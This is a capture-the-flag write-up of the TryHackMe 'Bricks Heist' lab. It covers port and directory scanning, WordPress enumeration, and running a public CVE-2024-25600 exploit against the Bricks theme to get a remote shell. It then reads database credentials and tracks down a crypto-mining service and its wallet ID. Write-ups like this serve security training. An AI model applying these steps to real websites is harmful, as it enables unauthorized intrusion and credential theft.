## THM CTF - TryHack3M: Bricks Heist

We can start changing local DNS to easily handle all the process.
```
sudo nano /etc/hosts
```
Add the record:
```
xxx.xxx.xxx.xxx	   bricks.thm
```
Now we can proceed with an Nmap scan.
```
sudo nmap -sS -T4 bricks.thm -p-
sudo nmap -sS -T4 bricks.thm -p22,80,443,3306 -sV
```
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Python http.server 3.5 - 3.10
443/tcp  open  ssl/http Apache httpd
3306/tcp open  mysql    MySQL (unauthorized)
```
```Port 80``` for now is a dead end, so we can try to enumerate ```port 443```.
```
gobuster dir -u https://bricks.thm -w /usr/share/wordlists/dirb/common.txt -x php,txt,json,log,db,html -k
```
While we wait for GoBuster to complete, analysing the page reveals some relevant information.
```
The site is developed on Wordpress 6.5.
https://bricks.thm/xmlrpc.php?rsd
https://bricks.thm/wp-json/
https://bricks.thm/wp-login.php
```
We can also launch ```WPScan```:
```
wpscan --url https://bricks.thm --enumerate p --disable-tls-checks 
```
Thanks to ```WPScan``` we are able to find the ```theme version```.
```
https://bricks.thm/wp-content/themes/bricks/style.css
Version 1.9.5
```
Searching the web for some vulnerabilities, we find this:

[https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)

We can use this vulnerability to gain access to the target.

We're going to create a new folder in ```Downloads``` dedicated to this exploit.
```
mkdir Bricks
cd Bricks
git clone https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT
python -m venv /home/kali/Downloads/Bricks/venv
sudo /home/kali/Downloads/Bricks/venv/bin/pip install alive_progress
sudo /home/kali/Downloads/Bricks/venv/bin/pip install requests
sudo /home/kali/Downloads/Bricks/venv/bin/pip install bs4
sudo /home/kali/Downloads/Bricks/venv/bin/pip install rich
sudo /home/kali/Downloads/Bricks/venv/bin/pip install prompt_toolkit
sudo /home/kali/Downloads/Bricks/venv/bin/python /home/kali/Downloads/Bricks/CVE-2024-25600-EXPLOIT/CVE-2024-25600.py -u https://bricks.thm
```
Obtaining a ```shell``` on the remote machine enables us to capture the initial flag.

Looking in the ```wp-config.php``` file we are able to find ```DB credentials```.

But to answer the question we need to run the command.
```
ps aux
```
and investigate for malicious processes.
There are too many processes, so we need to narrow down the results.
We need to find a service, so we can try with
```
systemctl list-units --type=service --state=running
```
We find a strange service with an unusual description.
```
ubuntu.service loaded active running TRYHACK3M
```
```
systemctl cat ubuntu.service
```
This way we can find the process and the service answering the second and the third question.

We need to find the log file of this service, so we try to enumerate the folder discovered before.
```
ls /lib/NetworkManager/
grep -ril "miner" /lib/NetworkManager/
```
finding the file we need.

In this file we can find an ID that we can decrypt with the use of ```CyberChef magic wand!```

However, we are looking for much shorter results.
We then check online the usual length of a wallet ID and find that our discovery is too long.
Analysing the result, we discover that we can split it into two.
The two halves are very similar, so we check online for a tool that tell us if one of the two is valid Wallet ID.

This site [https://checkcryptoaddress.com/](https://checkcryptoaddress.com/) reveals to us the real Wallet ID.

The last flag need some OSINT reading Wallet ID transaction to identify the threat group behind it.
